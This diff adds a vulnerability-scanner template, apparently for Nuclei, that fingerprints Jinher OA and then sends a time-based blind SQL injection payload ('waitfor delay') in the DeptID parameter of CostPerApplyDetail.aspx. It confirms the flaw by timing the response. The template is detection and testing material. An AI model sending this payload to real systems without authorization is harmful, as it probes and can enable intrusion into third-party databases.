@@ -1,0 +1,42 @@
+id: poc-yaml-jinher-jhsoft-costperapplydetail-aspx-sqli
+info:
+  name: 金和OA CostPerApplyDetail.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-application
+    method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers:
+      - type: word
+        words:
+          - "JHSoft"
+
+  - id: detect-sqli
+    method: GET
+    path:
+      - "{{BaseURL}}/c6/JHSoft.Web.CostControl/Cost/CostPerApplyDetail.aspx/?DeptID=1'waitfor+delay%270:0:{{t1}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "查看借款明细"
+          - "发起部门"
+          - "单据编号"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
